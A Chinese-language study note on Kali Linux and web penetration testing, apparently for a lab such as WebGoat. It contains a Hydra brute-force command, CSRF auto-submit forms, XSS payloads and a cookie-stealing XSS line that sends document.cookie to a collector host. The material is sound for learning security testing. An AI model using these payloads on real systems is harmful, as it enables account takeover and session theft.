# kali

## 下载安装

下载地址：<https://www.kali.org/downloads/.html>，选择`Kali Linux 64 bit Vbox`，跳转到[Offensive Security Download Page](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)，选择`Kali Linux VirtualBox Images`选项卡，选择`Kali Linux Vbox 64 Bit Ova - Torrent`，下载种子文件。

下载torrent工具：[BitComet](http://www.bitcomet.com/en)

在VirtualBox中导入kali-linux-2019.1-vbox-amd64.ova

## 渗透过程

1. DNS解析域名子域名，看有哪些IP，了解服务器组网。
2. Nmap扫描开放了哪些port，对应端口运行哪些服务，服务版本，OS版本。
3. 若存在Web服务器，查看https协议版本和使用的加密套件。
4. F12查看页面元素是否存在隐藏域。
5. 尝试修改cookie。
6. 获取robots.txt查找后台入口。
7. 爬虫所有链接获取更多URL，进一步了解后台及部署了哪些应用。
8. burpsuite拦截修改请求，如上传文件把`content-type: text/html`改成`image/png`，修改`User-Agent`。
9. burpsuite intruder爆破爬取URL
10. repeater多次修改请求
11. 用户身份在客户端请求参数中携带，如id，篡改。


## 安全维度

### 一、身份验证

- 用户名口令：登录，注册，重置密码等页面枚举用户名比较响应时间，intruder爆破，字典爆破口令。
- 基本身份验证：使用Hydra进行Authorization: basic base64code=爆破：`hydra -Luser_list.txt -P top25_passwords.txt -u -e ns http-get://192.168.56.11/WebGoat`。
    - -u 先迭代用户名，防止被锁定
    - -e ns 使用空密码

!!! tip
    每个用户最多使用四次登录尝试：1. 空，2. 与用户名相同，3. 123456

- 摘要身份验证：MD5(用户名，密码，nonce)
- NTLM/Windows身份验证：持久连接交换challenge
- Kerberos身份验证：Windows凭证登录
- Bearer tokens
- 爆破tomcat部署webshell


### 二、会话管理

#### cookie中的会话标识

!!! warning
    如果cookie中的sessionID没有httponly，若存在xss，可以发送恶意请求。

- 会话固定：构造恶意链接诱骗用户点击，使用其预设的SESSIONID
- burp sequencer分析sessionid是否随机：获取存在set-cookie的响应，发送到sequencer，分析cookie，解码获取中的sessionid

##### CSRF

POC：创建一个页面，包含form指向攻击请求地址。 --> 在javascript里自动提交。 --> 诱骗受害者在同一个浏览器中访问该页面。

```html tab="使用脚本自动提交"
<form action="http://www.baidu.com" method="POST" id="csrf_form">
    <input name="description" value="">
</form>
<script>
    var form = document.getElementById("csrf_form");
    form.submit();
</script>
```

```html tab="在body加载时提交"
<script>
function dosubmit() {
    document.getElementById(form).submit()
}
</script>
<body onload=dosubmit()></body>
```

##### XSS

特征：输入`<`原样显示，查看源码未做编码。

POC：

- `<script>alert('xss')</script>`
- `<img src=x onerror="javascript:alert('xss')">`
- 闭合如`<input value="输入的内容">`：`" onmouserover="javascript:alert('xss')` --> `<input value="输入的内容" onmouseover="javascript:alert('xss')">`
- 在href属性中注入链接或者其他事件，使用户在点击的时候触发：`<a href="javascript:alert('xss')">点击我</a>`

!!! example "利用XSS获取cookie"
    启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。


#### token


## 特征

- BASE64：包含大小写字母数字+/，以%3D(==)结尾
- SHA1：40位16进制字符串，每个16进制代表4位，40x4=160位
